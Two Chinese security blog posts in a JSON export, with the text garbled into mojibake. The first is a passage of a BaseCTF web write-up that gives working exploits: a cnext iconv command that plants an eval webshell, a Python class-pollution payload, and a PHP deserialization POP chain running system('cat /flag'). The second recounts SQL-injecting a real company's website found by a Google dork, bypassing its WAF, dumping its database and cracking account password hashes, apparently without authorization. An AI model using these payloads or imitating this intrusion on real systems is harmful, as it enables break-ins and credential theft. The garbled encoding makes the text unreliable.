(å‰ç½®) ä½¿ç”¨è¿™ä¸ªé¡¹ç›®æ‰“glibcçš„iconv()å‡½æ•°å°†æ–‡ä»¶è¯»å–å˜æˆrce\nå°†dataåæ”¹ä¸º.text,ä¸ç„¶æ— æ³•æ­£å¸¸è¾“å‡º\npayloadpython3 cnext-exploit.py http://challenge.basectf.fun:34357/ \u0026quot;echo '\u0026lt;?=@eval(\\$_POST[0]);?\u0026gt;' \u0026gt; shell.php\u0026quot;\nèšå‰‘è¿æ¥æ‰§è¡Œæ–‡ä»¶å³å¯\n[Fin] Lucky Number æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from flask import Flask,request,render_template_string,render_template from jinja2 import Template import json import heaven def merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() BLACKLIST_IN_index = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;] def is_json(data): try: json.loads(data) return True except ValueError: return False @app.route(\u0026#39;/m4G1c\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def pollute(): if request.method == \u0026#39;POST\u0026#39;: if request.is_json: merge(json.loads(request.data), instance) result = heaven.create() message = result[\u0026#34;message\u0026#34;] return \u0026#34;è¿™ä¸ªé­”æœ¯è¿˜è¡Œå§ \u0026#34; + message else: return \u0026#34;æˆ‘è¦jsonçš„é­”æœ¯\u0026#34; return \u0026#34;è®°å¾—ç”¨POSTæ–¹æ³•æŠŠé­”æœ¯äº¤ä¸Šæ¥\u0026#34; #heaven.py def create(kon=\u0026#34;Kon\u0026#34;, pure=\u0026#34;Pure\u0026#34;, *, confirm=False): if confirm and \u0026#34;lucky_number\u0026#34; not in create.__kwdefaults__: return {\u0026#34;message\u0026#34;: \u0026#34;å—¯å—¯ï¼Œæˆ‘å·²ç»çŸ¥é“ä½ è¦åˆ›é€ ä¸œè¥¿äº†ï¼Œä½†æ˜¯ä½ æ€ä¹ˆä¸å‘Šè¯‰æˆ‘è¦åˆ›é€ ä»€ä¹ˆï¼Ÿ\u0026#34;, \u0026#34;lucky_number\u0026#34;: \u0026#34;nope\u0026#34;} if confirm and \u0026#34;lucky_number\u0026#34; in create.__kwdefaults__: return {\u0026#34;message\u0026#34;: \u0026#34;è¿™æ˜¯ä½ çš„lucky_numberï¼Œè¯·æ‹¿å¥½ï¼Œå»/checkä¸‹æ£€æŸ¥ä¸€ä¸‹å§\u0026#34;, \u0026#34;lucky_number\u0026#34;: create.__kwdefaults__[\u0026#34;lucky_number\u0026#34;]} return {\u0026#34;message\u0026#34;: \u0026#34;ä½ æœ‰ä»€ä¹ˆæƒ³åˆ›é€ çš„å—ï¼Ÿ\u0026#34;, \u0026#34;lucky_number\u0026#34;: \u0026#34;nope\u0026#34;} è§£é¢˜é‡ç‚¹æ˜¯è¿™ä¸¤ä¸ªå±æ€§\næ€ä¹ˆå¯¼å…¥sysæ¨¡å—å‘¢ï¼Œçœ‹äº†å®˜æ–¹wpæ‰çŸ¥é“åœ¨pythonä¸­å­˜åœ¨ç€**specå†…ç½®å±æ€§ï¼ŒåŒ…å«äº†å…³äºç±»åŠ è½½æ—¶çš„ä¿¡æ¯ï¼Œå®šä¹‰åœ¨Lib/importlib/_bootstrap.pyçš„ç±»ModuleSpecï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é‡‡ç”¨\u0026lt;æ¨¡å—å\u0026gt;.spec.init.globals[\u0026lsquo;sys\u0026rsquo;]**è·å–åˆ°sysæ¨¡å—ï¼Œæ­¤å¤„å¯¼å…¥äº†jsonæ¨¡å—å°±å¯ä»¥ä½¿ç”¨jsonæ¨¡å—è·å–\npayload,æ‹¿å»jsonæ ¼å¼åŒ–ä¸€ä¸‹å³å¯\n1 {\u0026#34;__init__\u0026#34;:{\u0026#34;__globals__\u0026#34;:{\u0026#34;json\u0026#34;:{\u0026#34;__sepc__\u0026#34;:{\u0026#34;__init__\u0026#34;:{\u0026#34;__globals__\u0026#34;:{\u0026#34;sys\u0026#34;:{\u0026#34;modules\u0026#34;:{\u0026#34;heaven\u0026#34;:{\u0026#34;create\u0026#34;:{\u0026#34;__kwdefaults__\u0026#34;:{\u0026#34;confirm\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;lucky_number\u0026#34;:\u0026#34;5346\u0026#34;}}}}}}}}}}}} ä¼ å‚åæç¤ºå»/checkæ£€æŸ¥ä¸€ä¸‹\næ£€æŸ¥æˆåŠŸäº†ï¼Œå»å¯¹åº”ç›®å½•ssti\nè¿™é‡Œåˆ©ç”¨os._wrap_closeä¸­çš„popenæ–¹æ³•ç›´æ¥æ‰§è¡Œå‘½ä»¤å³å¯ï¼Œæ¨¡å—æ–¹æ³•æœ‰å¾ˆå¤š\n[Fin] ez_php è¿™é“é¢˜å‡ºç°äº†å¾ˆå¤šæ–°çŸ¥è¯†ï¼Œæ¯”å¦‚å¼•ç”¨ç»•è¿‡ï¼Œphp GCå›æ”¶æ”»å‡»ï¼Œmb_substr,mb_strposå­—ç¬¦ä¸²é€ƒé€¸ï¼Œç†è§£æ¸…æ¥šåç®—æ˜¯æ”¶ç›Šé¢‡ä¸°ï¼Œå‚è€ƒæ–‡ç« ï¼š\n()[ctfshow_XGCTF_è¥¿ç“œæ¯ | æ™¨æ›¦çš„ä¸ªäººå°ç«™ (chenxi9981.github.io)]\n()[(à¸…\u0026gt;Ï‰\u0026lt;*à¸…) å™«åˆå¥½å•¦ ~phpååºåˆ—åŒ– | æ™¨æ›¦çš„ä¸ªäººå°ç«™ (chenxi9981.github.io)]\næºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 \u0026lt;?php highlight_file(__file__); function substrstr($data) { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } class Hacker{ public $start; public $end; public $username=\u0026#34;hacker\u0026#34;; public function __construct($start){ $this-\u0026gt;start=$start; } public function __wakeup(){ $this-\u0026gt;username=\u0026#34;hacker\u0026#34;; $this-\u0026gt;end = $this-\u0026gt;start; } public function __destruct(){ if(!preg_match(\u0026#39;/ctfer/i\u0026#39;,$this-\u0026gt;username)){ echo \u0026#39;Hackerï¼\u0026#39;; } } } class C{ public $c; public function __toString(){ $this-\u0026gt;c-\u0026gt;c(); return \u0026#34;C\u0026#34;; } } class T{ public $t; public function __call($name,$args){ echo $this-\u0026gt;t-\u0026gt;t; } } class F{ public $f; public function __get($name){ return isset($this-\u0026gt;f-\u0026gt;f); } } class E{ public $e; public function __isset($name){ ($this-\u0026gt;e)(); } } class R{ public $r; public function __invoke(){ eval($this-\u0026gt;r); } } if(isset($_GET[\u0026#39;ez_ser.from_you\u0026#39;])){ $ctf = new Hacker(\u0026#39;{{{\u0026#39;.$_GET[\u0026#39;ez_ser.from_you\u0026#39;].\u0026#39;}}}\u0026#39;); if(preg_match(\u0026#34;/\\[|\\]/i\u0026#34;, $_GET[\u0026#39;substr\u0026#39;])){ die(\u0026#34;NONONO!!!\u0026#34;); } $pre = isset($_GET[\u0026#39;substr\u0026#39;])?$_GET[\u0026#39;substr\u0026#39;]:\u0026#34;substr\u0026#34;; $ser_ctf = substrstr($pre.\u0026#34;[\u0026#34;.serialize($ctf).\u0026#34;]\u0026#34;); $a = unserialize($ser_ctf); throw new Exception(\u0026#34;æ‚é±¼~æ‚é±¼~\u0026#34;); } é¦–å…ˆä¾¿æ˜¯æ„é€ popåˆ©ç”¨é“¾ï¼Œè¿™é“é¢˜çš„æ˜¯æ¯”è¾ƒå¥½æ„é€ çš„ï¼Œæœ‰ä¸ªä»¥å‰ä¸çŸ¥é“çš„çŸ¥è¯†ç‚¹æ˜¯__getæ–¹æ³•ä¸­ å¦‚æœä½ æ²¡æœ‰ä¸º t å±æ€§èµ‹å€¼ï¼Œæˆ–è€…å°†å…¶è®¾ç½®ä¸º nullï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨ $this-\u0026gt;t-\u0026gt;t æ—¶å°†ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå› ä¸ºä½ å°è¯•åœ¨ä¸€ä¸ª null å€¼ä¸Šè®¿é—®å±æ€§\nä»¥å‰åªçŸ¥é“è®¿é—®ä¸å¯è®¿é—®å±æ€§å’Œæœªå®šä¹‰æˆå‘˜å˜é‡å¯ä»¥è§¦å‘ï¼Œå…¶å®æ²¡èµ‹å€¼å®šä¹‰è®¿é—®å±æ€§ä¹Ÿèƒ½è§¦å‘\nåˆ°Hackerç±»å‰è¿™ä¹ˆæ„é€ å³å¯\n1 2 3 4 5 6 7 8 9 10 $s1 = new R(); $s1-\u0026gt;r = \u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;; $s2 = new E(); $s2-\u0026gt;e = $s1; $s3 = new F(); $s3-\u0026gt;f = $s2; $s4 = new T(); $s4-\u0026gt;t = $s3; $s5 = new C(); $s5-\u0026gt;c = $s4; ç„¶åHackerç±»ä¸­ç»•è¿‡__wakeupæ–¹æ³•ï¼Œå› ä¸ºä¸‹é¢è¿˜æœ‰ä¸ªèµ‹å€¼æ“ä½œ$this-\u0026gt;end = $this-\u0026gt;startï¼Œæˆ‘ä»¬å¯ä»¥å¼•ç”¨èµ‹å€¼æ¥ç»•è¿‡\n1 2 $s6-\u0026gt;end = \u0026amp;$s6-\u0026gt;username; $s6-\u0026gt;start = $s5; åˆ°è¿™åˆ©ç”¨é“¾å·²ç»åŸºæœ¬æ„é€ å®Œäº†ï¼Œæ³¨æ„æºç ä¸­è¿˜æœ‰å¥throw new Exception(\u0026quot;æ‚é±¼~æ‚é±¼~\u0026quot;);æŠ›å‡ºå¼‚å¸¸ä¼šå¯¼è‡´__destructææ„æ–¹æ³•æ— æ³•æ‰§è¡Œä»è€Œå¯¼è‡´ååºåˆ—åŒ–è¿‡ç¨‹å¤±è´¥\nç»•è¿‡æŠ›å‡ºå¼‚å¸¸å°±éœ€è¦åˆ©ç”¨åˆ°PHPçš„GCåƒåœ¾å›æ”¶æœºåˆ¶ï¼Œæˆ‘ä¸¾ä¸ªä¾‹ï¼šæœ¬åœ°å¼€ä¸ªphpæœåŠ¡å™¨æ‰§è¡Œä»¥ä¸‹ä»£ç è¿›è¡Œæµ‹è¯•\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $flag = \u0026#34;flag{test_flag}\u0026#34;; class B { function __destruct() { global $flag; echo $flag; } } $a = unserialize($_GET[\u0026#39;ctf\u0026#39;]); throw new Exception(\u0026#39;nonono\u0026#39;); æ„é€ ä¸€ä¸ªpayload\nä¼ å…¥åå‘ç°æå‰æ‰§è¡Œäº†ææ„æ–¹æ³•echo $flag,åˆ©ç”¨æˆåŠŸ\nç”Ÿæˆpayloadååˆ«å¿˜äº†æ‰‹åŠ¨å°†é”®å2æ”¹ä¸º1ï¼Œä¸èƒ½ç›´æ¥å†™ä¸¤ä¸ª1ï¼Œè¿™æ ·ä¼šå¯¼è‡´valueç›´æ¥å˜ä¸ºnull\n1 $s7 = array(\u0026#39;1\u0026#39;=\u0026gt;$s6,\u0026#39;2\u0026#39;=\u0026gt;null); æœ€åå°±æ˜¯substrstrå‡½æ•°ï¼Œçœ‹ä¼¼è¿”å›ä¸­æ‹¬å·å†…å®¹å’Œä¸‹æ–‡ä¸€è‡´æ²¡ä»€ä¹ˆé”™è¯¯\n1 2 3 4 5 6 7 8 function substrstr($data) { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } --------------- --- $ser_ctf = substrstr($pre.\u0026#34;[\u0026#34;.serialize($ctf).\u0026#34;]\u0026#34;); å®é™…ä¸Šç”Ÿæˆçš„æ•°æ®æ²¡æœ‰ä¸­æ‹¬å·è€Œä¸”å‰é¢è¿˜æœ‰ä¸‰åå…«ä½æ— æ•ˆæ•°æ®å½±å“ååºåˆ—åŒ–\næœ¬åœ°å°è¯•å‘ç°åºåˆ—åŒ–æ•°æ®è¢«æˆªå–åæ˜¯æ— æ³•æ‰§è¡Œçš„\nå…³äºmb_strposå’Œmb_substrçš„çŸ¥è¯†ï¼Œ\n1 2 3 4 5 6 æ¯å‘é€ä¸€ä¸ª%f0abcï¼Œmb_strposè®¤ä¸ºæ˜¯4ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®3ä¸ªå­—èŠ‚ æ¯å‘é€ä¸€ä¸ª%f0%9fab,mb_strposè®¤ä¸ºæ˜¯3ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®2ä¸ªå­—èŠ‚ æ¯å‘é€ä¸€ä¸ª%f0%9f%9fa,mb_strposè®¤ä¸ºæ˜¯2ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®1ä¸ªå­—èŠ‚ unicodeå 4å­—èŠ‚ï¼Œmb_substrä¼šå°†æ•°æ®%f0abcä¸­çš„abæ‹¿å»è¡¥å…¨å››å­—èŠ‚ï¼Œä»è€Œè®¤ä¸ºè¯¥æ•°æ®åªæœ‰cçš„ä¸€ä¸ªå­—èŠ‚ %f0%9fabè¿™ç§åˆ™ä¼šä¿ç•™æœ€å°‘ä¸€ä½bï¼Œæ‰€ä»¥åˆè®¤ä¸ºåªæœ‰ä¸€å­—èŠ‚ æ ¹æ®åŸå…ˆæ„é€ é“¾è¾“å‡ºæˆ‘ä»¬éœ€è¦çš„æ•°æ®æ˜¯ä¸éœ€è¦å‰é¢è¿™38ä½çš„ï¼Œå¯ä»¥åˆ©ç”¨ä»¥ä¸ŠçŸ¥è¯†åˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸æ¥æˆªå–æ‰è¿™38ä½æ•°æ®åªç•™æˆ‘ä»¬çš„payload\næœ€ç»ˆexpï¼Œåˆ«å¿˜äº†å°†ç”Ÿæˆæ•°æ®é”®åæ”¹ä¸º1ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 $a = \u0026#34;%f0abc\u0026#34;; error_reporting(0); function substrstr($data)//ææƒä¸­æ‹¬å·ä¹‹é—´çš„å†…å®¹ { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } class Hacker { public $start; public $end; public $username = \u0026#34;ctfer\u0026#34;; public function __wakeup() { $this-\u0026gt;username = \u0026#34;hacker\u0026#34;; $this-\u0026gt;end = $this-\u0026gt;start; } public function __destruct() { if (!preg_match(\u0026#39;/ctfer/i\u0026#39;, $this-\u0026gt;username)) { echo \u0026#39;Hackerï¼\u0026#39;; } } } class C { public $c; public function __toString() { $this-\u0026gt;c-\u0026gt;c(); return \u0026#34;C\u0026#34;; } } class T { public $t; public function __call($name, $args) { echo $this-\u0026gt;t-\u0026gt;t; } } class F { public $f; public function __get($name) { return isset($this-\u0026gt;f-\u0026gt;f); } } class E { public $e; public function __isset($name) { ($this-\u0026gt;e)(); } } class R { public $r; public function __invoke() { eval($this-\u0026gt;r); } } $s1 = new R(); $s1-\u0026gt;r = \u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;; $s2 = new E(); $s2-\u0026gt;e = $s1; $s3 = new F(); $s3-\u0026gt;f = $s2; $s4 = new T(); $s4-\u0026gt;t = $s3; $s5 = new C(); $s5-\u0026gt;c = $s4; $s6 = new Hacker(); $s6-\u0026gt;end = \u0026amp;$s6-\u0026gt;username; $s6-\u0026gt;start = $s5; $s7 = array(\u0026#39;1\u0026#39;=\u0026gt;$s6,\u0026#39;2\u0026#39;=\u0026gt;null); //echo serialize($s7).\u0026#34;\\n\u0026#34;; //echo urlencode(serialize($s7)).\u0026#34;\\n\u0026#34;; echo \u0026#34;?substr=\u0026#34;.str_repeat($a,12).\u0026#34;%f0%9fab\u0026amp;ez[ser.from_you=\u0026#34;.urlencode(serialize($s7)).\u0026#34;\\n\u0026#34;; payload\n1 %f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab\u0026amp;ez[ser.from_you=a%3A2%3A%7Bi%3A1%3BO%3A6%3A%22Hacker%22%3A3%3A%7Bs%3A5%3A%22start%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A1%3A%22c%22%3BO%3A1%3A%22T%22%3A1%3A%7Bs%3A1%3A%22t%22%3BO%3A1%3A%22F%22%3A1%3A%7Bs%3A1%3A%22f%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A1%3A%22e%22%3BO%3A1%3A%22R%22%3A1%3A%7Bs%3A1%3A%22r%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7D%7D%7Ds%3A3%3A%22end%22%3Bs%3A5%3A%22ctfer%22%3Bs%3A8%3A%22username%22%3BR%3A9%3B%7Di%3A1%3BN%3B%7D solved!\n","date":"2024-09-12T17:26:54+08:00","permalink":"http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/","title":"BaseCTFæ‹›æ–°èµ› Web-Wp"},{"content":"å‘ç°æ–¹å¼ åˆ©ç”¨gooleè¯­æ³•inurl=\u0026quot;id=\u0026quot;å‘ç°æŸå…¬å¸phpç«™ç‚¹ï¼Œåœ¨idåè¾“å…¥1' and 'a'='a'--æ˜¾ç¤ºè¢«wafæ‹¦æˆª\nè¿™ä¸ªwafæˆ‘å»æœäº†ä¸€ä¸‹æ˜¯è¥¿æ•°çš„ä¸€ä¸ªwafï¼ŒæŒºæ‹‰çš„\nç»è¿‡å°è¯•å‘ç°æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯å°†ç©ºæ ¼ç”¨+æ›¿æ¢ã€‚è¾“å…¥1'+and+'a'='a'--åé¡µé¢æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥æ¼æ´\nåŸºæœ¬ä¿¡æ¯ 1 2 3 4 5 ?id=1+union+select+database()-- ?id=1+union+select+version()-- ?id=1+union+select+user()-- æˆåŠŸæŸ¥è¯¢åˆ°å½“å‰åº“åï¼šsanying mysqlç‰ˆæœ¬ï¼š5.7.43 userï¼šsanying@127.0.0.1 è¿™ä¸ªç‰ˆæœ¬æ˜¯å¥½å¤šå¹´å‰çš„äº†ï¼Œé«˜ç‰ˆæœ¬çš„ç”¨æ³•ä¸èƒ½åœ¨è¿™ç”¨\næŸ¥åº“ åœ¨æ„é€ çš„æ—¶å€™åˆå‘ç°è¿™ä¸ªwafè§„åˆ™é‡Œé¢group_concatä¸èƒ½å’Œæ‹¬å·è¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”¨limitä¸€æ¡ä¸€æ¡æŸ¥\næ„é€ payload\n?id=-1+union+select+schema_name+from+information_schema.schemata+limit+0,1--\nå‘ç°åªæœ‰ä¸¤ä¸ªåº“ï¼Œå…¶ä¸­ä¸€ä¸ªè¿˜æ˜¯ç³»ç»Ÿåº“(Â°ãƒ¼Â°ã€ƒ)\nçœ‹æ¥åªç”¨è„±sanyingåº“å°±è¡Œäº†ï¼Œç³»ç»Ÿåº“å°±ä¸ç®¡äº†\næŸ¥è¡¨ æ„é€ payload\n?id=-1+union+select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1--\nåé¢å¯ä»¥ç”¨ç”¨burpçš„æ”»å‡»æ¨¡å—æˆ–è€…è‡ªå·±å†™ä¸ªè„šæœ¬æå–ï¼Œæˆ‘é€‰çš„åè€…ã€‚å› ä¸ºå‰è€…è¿˜è¦è‡ªå·±å»æŠŠè¡¨åæŠ„ä¸‹æ¥å¤ªéº»çƒ¦ï¼Œæˆ‘æ ¹æ®é¡µé¢å›æ˜¾åˆ©ç”¨python reåº“å’Œæ­£åˆ™å°†å›æ˜¾å†…å®¹æå–å‡ºæ¥å³å¯ï¼Œæœ€åå‘ç°æœ‰å…±17å¼ è¡¨\næŸ¥åˆ—å æŸ¥åˆ—åçš„æ—¶å€™åˆå‘ç°ä¸èƒ½æŒ‡å®šæ•°æ®åº“æˆ–è€…å…·ä½“çš„è¡¨åæ¥æŸ¥ï¼Œåæ­£æˆ‘ä»¬åªè„±ä¸€ä¸ªåº“æ•°æ®åº“åå°±å¯ä»¥ä¸€ç›´ç”¨database(),è¡¨åå°±ç”¨å­æŸ¥è¯¢+limit n,1æ¥æŒ‡å®šï¼Œåç»­æŠŠnå½“ä½œå¾ªç¯å˜é‡å³å¯\næ„é€ payload\n?id=-1+union+select+column_name+from+information_schema.columns+where+table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+n,1)+and+table_schema=database()+limit+0,1--\nç„¶åå†™å…¥è„šæœ¬è‡ªåŠ¨åŒ–æŸ¥è¯¢æ¯å¼ è¡¨çš„åˆ—å\næŸ¥æ•°æ® åˆ°è¿™é‡Œäº†å¼€å§‹æˆ‘æ˜¯æƒ³å°½åŠæ³•æ„é€ å‡ºåˆ—åï¼Œç»“æœæœ€åå‘ç°å¯ä»¥ç›´æ¥æŒ‡å®šåˆ—åæ¥æŸ¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè¿™ä¸ªwafç»™æˆ‘äººæ•´éº»äº† â•®(â•¯â–½â•°)â•­\næ„é€ payload\n-1+union+select+{data[i]}+from+Sanying.{km}\nè¿™é‡Œæ˜¯ä»è„šæœ¬é‡Œé¢å¤åˆ¶å‡ºæ¥çš„ï¼Œæˆ‘æ˜¯å…ˆæŠŠåˆ—åå¤„ç†æˆåˆ—è¡¨\nè¿™é‡Œå› ä¸ºä¸å¤ªä¼šåè°ƒè¿™äº›æ•°æ®çš„ä½ç½®å¤„ç†è¾“å‡ºåˆ°xlsxï¼Œæœ‰äº›åˆ—è¿˜æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥æˆ‘åªèƒ½åŠè‡ªåŠ¨åŒ–æ‰‹åŠ¨å¡«æ•°æ®åˆ°excelï¼Œæœ‰å¤§ä½¬çš„è¯æµ‡æµ‡æˆ‘ï¼\næˆæœ æœ€åå°±æ˜¯è¿™æ ·ï¼Œæ‹¿åˆ°äº†ä¸¤ä¸ªè´¦å·å’Œä¸€äº›ä¿¡æ¯ï¼Œè¿™åº“ä¹Ÿæ˜¯çœŸçš„è€äº†ï¼Œåå‡ å¹´å‰çš„äº†ï¼Œå¯†ç è¿˜æ˜¯ç”¨çš„md5ï¼Œä½†æ˜¯æœ€è¿‘åˆæœ‰äººç™»å½•ã€‚åé¢åˆ©ç”¨hashcatå’Œåœ¨çº¿ç½‘ç«™æˆåŠŸè§£å‡ºä¸¤ä¸ªmd5å“ˆå¸Œï¼Œä¹Ÿç®—æ˜¯ç¨æœ‰æ”¶è·ï¼\nå…è´£å£°æ˜ï¼š ç›®çš„ï¼šæœ¬æ–‡æ—¨åœ¨åˆ†äº«æœ‰å…³ç½‘ç»œå®‰å…¨æ¸—é€çŸ¥è¯†çš„ä¿¡æ¯ï¼Œä»¥ä¿ƒè¿›å¯¹ç½‘ç»œå®‰å…¨çš„ç†è§£å’Œæé«˜ä¸ªäººå’Œç»„ç»‡çš„å®‰å…¨æ„è¯†ã€‚è¿™äº›çŸ¥è¯†å’ŒæŠ€æœ¯åº”ä»…ç”¨äºåˆæ³•çš„ã€æˆæƒçš„å®‰å…¨æµ‹è¯•å’Œçº¢é˜Ÿæ“ä½œï¼Œå¹¶éµå®ˆé€‚ç”¨çš„æ³•å¾‹å’Œé“å¾·è§„èŒƒã€‚\næ³•å¾‹åˆè§„ï¼šåœ¨å‚è€ƒæœ¬æ–‡æ‰€æä¾›çš„æ¸—é€æµ‹è¯•å’Œæ”»å‡»æŠ€æœ¯æ—¶ï¼Œè¯·ç¡®ä¿éµå®ˆæ‚¨æ‰€åœ¨å›½å®¶æˆ–åœ°åŒºçš„æ³•å¾‹æ³•è§„ã€‚æœªç»åˆæ³•æˆæƒå’Œæ˜ç¡®è®¸å¯ï¼Œç¦æ­¢ä½¿ç”¨è¿™äº›çŸ¥è¯†å’ŒæŠ€æœ¯ä»äº‹éæ³•æ´»åŠ¨ï¼Œå¦‚æœªç»æˆæƒçš„å…¥ä¾µã€æ•°æ®ç›—å–ã€ç ´åæ€§æ”»å‡»ç­‰ã€‚\nè´£ä»»é™åˆ¶ï¼šä½¿ç”¨æœ¬æ–‡æ‰€æä¾›çš„ä¿¡æ¯å’ŒæŠ€æœ¯çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚å› æ“ä½œä¸å½“æˆ–å…¶ä»–åŸå› å¯¼è‡´ä»»ä½•æŸå¤±æˆ–æŸå®³ï¼Œä½œè€…æ¦‚ä¸è´Ÿè´£ã€‚ä½¿ç”¨è€…åº”è‡ªè¡Œæ‰¿æ‹…æ‰€æœ‰é£é™©å’Œåæœã€‚\nå…è´£å£°æ˜ï¼šæœ¬æ–‡çš„åˆ†äº«ä»…ä¸ºæŠ€æœ¯äº¤æµå’Œå­¦ä¹ ä¹‹ç”¨ï¼Œå¹¶ä¸é¼“åŠ±ä»»ä½•éæ³•æ´»åŠ¨ã€‚ä½œè€…ä¸å¯¹ä»»ä½•ä¸ªäººæˆ–ç»„ç»‡çš„éæ³•è¡Œä¸ºæ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚\nå‡ºäº‹ä¸ä½œè€…æ— å…³ï¼šä½¿ç”¨è€…åœ¨è¿ç”¨æœ¬æ–‡æä¾›çš„çŸ¥è¯†å’ŒæŠ€æœ¯æ—¶ï¼Œåº”è‡ªè¡Œåˆ¤æ–­å’Œæ‰¿æ‹…è´£ä»»ã€‚å¦‚å› ä½¿ç”¨è€…è¿åæ³•å¾‹æ³•è§„æˆ–æ»¥ç”¨æœ¬æ–‡æä¾›çš„çŸ¥è¯†å’ŒæŠ€æœ¯è€Œå¯¼è‡´ä»»ä½•é—®é¢˜ã€æŸå¤±æˆ–æ³•å¾‹è´£ä»»ï¼Œä¸ä½œè€…æ— å…³ã€‚ä½¿ç”¨è€…åº”å¯¹å…¶è¡Œä¸ºè´Ÿå®Œå…¨è´£ä»»ã€‚\nåˆæ³•æˆæƒï¼šåœ¨è¿›è¡Œå®‰å…¨æµ‹è¯•å’Œæ¸—é€æµ‹è¯•æ—¶ï¼Œä½¿ç”¨è€…åº”é¦–å…ˆè·å¾—ç›¸å…³ç³»ç»Ÿå’Œç½‘ç»œçš„åˆæ³•æˆæƒï¼Œç¡®ä¿æµ‹è¯•çš„å¯¹è±¡æ˜¯å±äºæ‚¨åˆæ³•æ‰€æœ‰æˆ–å¾—åˆ°æ˜ç¡®æˆæƒçš„ã€‚\næŒç»­å­¦ä¹ ï¼šç½‘ç»œå®‰å…¨æ˜¯ä¸€ä¸ªä¸æ–­å‘å±•å’Œæ¼”å˜çš„é¢†åŸŸï¼Œæœ¬æ–‡æä¾›çš„çŸ¥è¯†å’ŒæŠ€æœ¯å¯èƒ½éšæ—¶é—´è€Œè¿‡æ—¶æˆ–å¤±æ•ˆã€‚ä½¿ç”¨è€…åº”ä¸æ–­å­¦ä¹ å’Œæ›´æ–°çŸ¥è¯†ï¼Œå…³æ³¨æœ€æ–°çš„å®‰å…¨è¶‹åŠ¿ã€æ¼æ´å’Œé˜²æŠ¤æªæ–½ã€‚\né€šè¿‡é˜…è¯»å’Œä½¿ç”¨æœ¬æ–‡æä¾›çš„ä¿¡æ¯å’ŒæŠ€æœ¯ï¼Œè§†ä¸ºæ‚¨ç†è§£å¹¶åŒæ„ä»¥ä¸Šå…è´£å£°æ˜ï¼Œå¹¶åŒæ„è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨è¿™äº›çŸ¥è¯†å’ŒæŠ€æœ¯æ‰€äº§ç”Ÿçš„é£é™©å’Œåæœã€‚ä½œè€…å¯¹ä»»ä½•ä¸å½“ä½¿ç”¨æ‰€å¯¼è‡´çš„é—®é¢˜ã€æŸå¤±æˆ–æ³•å¾‹è´£ä»»æ¦‚ä¸è´Ÿè´£ã€‚\n","date":"2024-09-11T11:34:30+08:00","permalink":"http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"è®°ä¸€æ¬¡çœŸå®ç«™ç‚¹sqlæ³¨å…¥æ¼æ´"},{"content":" 